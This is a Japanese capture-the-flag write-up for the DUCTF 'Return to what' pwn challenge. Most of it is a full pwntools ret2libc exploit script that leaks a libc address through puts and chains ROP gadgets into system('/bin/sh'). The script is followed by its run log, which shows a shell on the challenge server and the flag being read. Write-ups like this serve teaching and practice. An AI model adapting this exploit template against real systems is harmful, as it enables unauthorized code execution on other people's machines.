# Return to what:pwn:200pts
This will show my friends!  
nc chal.duc.tf 30003  
Attached files:  
- return-to-what (sha256: a679b33db34f15ce27ae89f63453c332ca7d7da66b24f6ae5126066976a5170b)  
[return-to-what](return-to-what)  

# Solution
return-to-whatなので、おそらくlibcへ飛ばしてやれば良い。  
pwntoolsがすべてやってくれる。  
ret2libcのテンプレを使う。  
```python:hack.py
from pwn import *

elf = ELF('./return-to-what')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = remote('chal.duc.tf', 30003)
#io = process(elf.path)
rop = ROP(elf)

puts_plt = elf.plt['puts']
main = elf.symbols['main']
libc_start_main = elf.symbols['__libc_start_main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(puts_plt))
log.info("__libc_start_main: " + hex(libc_start_main))
log.info("pop rdi gadget: " + hex(pop_rdi))

base = b'A' * 56
print(io.recvline())
print(io.recvline())
payload = base + p64(pop_rdi) + p64(libc_start_main) + p64(puts_plt) + p64(main)
io.sendline(payload)
recieved = io.recvline().strip()
print(recieved)
print(io.recvline())

leak = u64(recieved.ljust(8, b'\x00'))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))
libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

binsh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

log.info("/bin/sh %s " % hex(binsh))
log.info("system %s " % hex(system))

payload = base + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()
```
実行する。  
```bash
$ ls
hack.py  return-to-what
$ python hack.py
[*] '/return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.duc.tf on port 30003: Done
[*] Loaded 14 cached gadgets for './return-to-what'
[*] puts@plt: 0x40102c
[*] __libc_start_main: 0x403ff0
[*] pop rdi gadget: 0x40122b
b"Today, we'll have a lesson in returns.\n"
b'Where would you like to return to?\n'
b'\xb0J\xf8LM\x7f'
b"Today, we'll have a lesson in returns.\n"
[*] Leaked libc address,  __libc_start_main: 0x7f4d4cf84ab0
[*] Address of libc 0x7f4d4cf63000
[*] /bin/sh 0x7f4d4d116e9a
[*] system 0x7f4d4cfb2440
[*] Switching to interactive mode
Where would you like to return to?
$ ls
flag.txt
return-to-what
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
```
flag.txt内にflagが書かれていた。  

## DUCTF{ret_pUts_ret_main_ret_where???}